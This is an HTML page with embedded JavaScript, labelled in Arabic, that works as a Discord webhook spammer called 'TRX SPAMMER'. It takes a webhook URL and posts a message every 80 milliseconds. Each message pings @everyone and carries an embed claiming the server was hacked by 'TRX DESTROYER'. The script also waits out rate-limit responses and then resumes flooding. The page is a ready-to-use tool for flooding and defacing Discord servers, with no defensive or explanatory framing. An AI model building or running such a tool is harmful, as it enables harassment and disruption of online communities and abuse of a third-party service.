<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>TRX · SPAM</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0a;color:#eee;font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .box{background:#141414;border:1px solid #2a2a2a;border-radius:40px;padding:40px;max-width:600px;width:100%}
        h1{text-align:center;font-size:32px;letter-spacing:6px;color:#fff;margin-bottom:5px}
        .sub{text-align:center;color:#555;font-size:11px;letter-spacing:4px;border-bottom:1px solid #222;padding-bottom:20px;margin-bottom:20px}
        label{color:#888;font-size:13px;display:block;margin-bottom:6px}
        input{width:100%;padding:14px;background:#0a0a0a;border:1px solid #2a2a2a;border-radius:30px;color:#fff;font-size:14px;direction:ltr;outline:none}
        input:focus{border-color:#555}
        .btn{width:100%;padding:16px;border:none;border-radius:30px;font-weight:700;font-size:16px;cursor:pointer;transition:0.3s;margin-top:10px;letter-spacing:2px}
        .btn-danger{background:#cc0000;color:#fff}
        .btn-danger:hover{background:#ff0000}
        .btn-outline{background:transparent;color:#fff;border:1px solid #333}
        .btn-outline:hover{background:#222}
        textarea{width:100%;height:150px;background:#0a0a0a;border:1px solid #2a2a2a;border-radius:20px;padding:14px;color:#888;font-family:monospace;font-size:13px;resize:vertical;outline:none;margin-top:10px}
        textarea:focus{border-color:#555}
        .status{text-align:center;color:#333;font-size:10px;letter-spacing:3px;margin-top:18px;border-top:1px solid #1a1a1a;padding-top:15px}
        .watermark{position:fixed;bottom:20px;right:30px;color:#222;font-size:11px;letter-spacing:3px}
        .counter{text-align:center;color:#ff4444;font-size:22px;font-weight:bold;margin:8px 0}
        .msg{text-align:center;font-size:13px;padding:8px;border-radius:12px;margin:6px 0}
        .msg-success{background:#0a2a0a;color:#0f0;border:1px solid #0f0}
        .msg-error{background:#2a0a0a;color:#f00;border:1px solid #f00}
    </style>
</head>
<body>
<div class="box">
    <h1>TRX</h1>
    <div class="sub">● SPAMMER — UNLIMITED ●</div>

    <label>🔗 رابط Webhook (يجب أن يبدأ بـ https://discord.com/api/webhooks/)</label>
    <input type="url" id="webhook" placeholder="https://discord.com/api/webhooks/..." value="">

    <button class="btn btn-danger" id="start">🚀 بدء الإرسال السريع</button>
    <button class="btn btn-outline" id="stop">⏹ إيقاف</button>
    <button class="btn btn-outline" id="test" style="background:#222;border-color:#444;">📡 اختبار الويب هوك</button>

    <div class="counter" id="counter">0 رسالة</div>
    <div id="statusMsg" class="msg" style="display:none;"></div>

    <label>📋 سجل العمليات</label>
    <textarea id="log" readonly placeholder="سجل الأحداث..."></textarea>
    <button class="btn btn-outline" id="copy" style="padding:10px;font-size:12px;margin-top:6px;">📋 نسخ السجل</button>

    <div class="status">TRX SPAMMER ● @everyone ● MRX 2026</div>
</div>
<div class="watermark">MRX · 2026</div>

<script>
    (() => {
        const webhookInput = document.getElementById('webhook');
        const startBtn = document.getElementById('start');
        const stopBtn = document.getElementById('stop');
        const testBtn = document.getElementById('test');
        const logArea = document.getElementById('log');
        const counter = document.getElementById('counter');
        const statusMsg = document.getElementById('statusMsg');
        const copyBtn = document.getElementById('copy');

        let active = false;
        let interval = null;
        let count = 0;
        let failures = 0;

        const log = (msg) => {
            const t = new Date().toLocaleTimeString('ar-SA');
            logArea.value += `[${t}] ${msg}\n`;
            logArea.scrollTop = logArea.scrollHeight;
        };

        const showStatus = (msg, type = 'success') => {
            statusMsg.style.display = 'block';
            statusMsg.textContent = msg;
            statusMsg.className = 'msg msg-' + type;
            setTimeout(() => { statusMsg.style.display = 'none'; }, 4000);
        };

        const send = async (isTest = false) => {
            const url = webhookInput.value.trim();
            if (!url) {
                showStatus('❌ أدخل رابط Webhook أولاً', 'error');
                log('❌ لا يوجد رابط');
                return false;
            }

            const payload = {
                content: '@everyone تم التهكير من قبل TRX | HUB - النظام التراكسي - @everyone',
                embeds: [{
                    title: '💀 TRX DESTROYER',
                    description: 'تم تهكير هذا السيرفر بواسطة TRX | النظام التراكسي - MRX 2026',
                    color: 0xff0000,
                    footer: { text: 'TRX ☣️ 2026' }
                }]
            };

            try {
                const res = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (res.ok) {
                    if (!isTest) {
                        count++;
                        counter.textContent = count + ' رسالة';
                        if (count % 10 === 0) log(`📨 ${count} رسالة مرسلة`);
                    } else {
                        showStatus('✅ تم الإرسال بنجاح! شوف الديسكورد.', 'success');
                        log('✅ اختبار ناجح');
                    }
                    failures = 0;
                    return true;
                } else if (res.status === 429) {
                    const retry = parseInt(res.headers.get('Retry-After')) || 2;
                    log(`⏳ معدل مرتفع، انتظار ${retry} ثانية`);
                    await new Promise(r => setTimeout(r, retry * 1000));
                    return true;
                } else if (res.status === 404) {
                    showStatus('❌ الويب هوك غير موجود أو محذوف!', 'error');
                    log('❌ 404 - Webhook غير صحيح');
                    stopSpam();
                    return false;
                } else {
                    log(`❌ فشل: ${res.status} ${res.statusText}`);
                    failures++;
                    if (failures > 5) {
                        showStatus('❌ فشل متكرر، تحقق من الرابط', 'error');
                        stopSpam();
                        return false;
                    }
                    return false;
                }
            } catch (e) {
                log(`❌ خطأ في الاتصال: ${e.message}`);
                showStatus('❌ خطأ في الاتصال: ' + e.message, 'error');
                failures++;
                if (failures > 5) {
                    stopSpam();
                    return false;
                }
                return false;
            }
        };

        const startSpam = async () => {
            if (active) {
                log('⚠️ الإرسال قيد التشغيل بالفعل');
                return;
            }
            if (!webhookInput.value.trim()) {
                showStatus('❌ أدخل رابط Webhook', 'error');
                return;
            }
            log('🔍 اختبار الويب هوك...');
            const ok = await send(true);
            if (!ok) {
                log('❌ فشل الاختبار، لن نبدأ الإرسال');
                return;
            }

            active = true;
            count = 0;
            failures = 0;
            counter.textContent = '0 رسالة';
            log('🔥 بدء الإرسال السريع (كل 80ms)...');

            await send(false);

            interval = setInterval(async () => {
                if (!active) {
                    clearInterval(interval);
                    interval = null;
                    return;
                }
                await send(false);
            }, 80);
        };

        const stopSpam = () => {
            if (interval) {
                clearInterval(interval);
                interval = null;
            }
            active = false;
            log(`⏹ توقف. إجمالي الرسائل: ${count}`);
            counter.textContent = count + ' رسالة (متوقف)';
            showStatus('⏹ تم الإيقاف', 'success');
        };

        const testWebhook = async () => {
            if (!webhookInput.value.trim()) {
                showStatus('❌ أدخل رابط Webhook', 'error');
                return;
            }
            log('🧪 جاري اختبار الويب هوك...');
            await send(true);
        };

        const copyLog = () => {
            logArea.select();
            logArea.setSelectionRange(0, 99999);
            document.execCommand('copy');
            showStatus('📋 تم نسخ السجل', 'success');
        };

        startBtn.addEventListener('click', startSpam);
        stopBtn.addEventListener('click', stopSpam);
        testBtn.addEventListener('click', testWebhook);
        copyBtn.addEventListener('click', copyLog);

        log('✅ جاهز. أدخل رابط webhook واضغط "بدء الإرسال"');
    })();
</script>
</body>
</html>
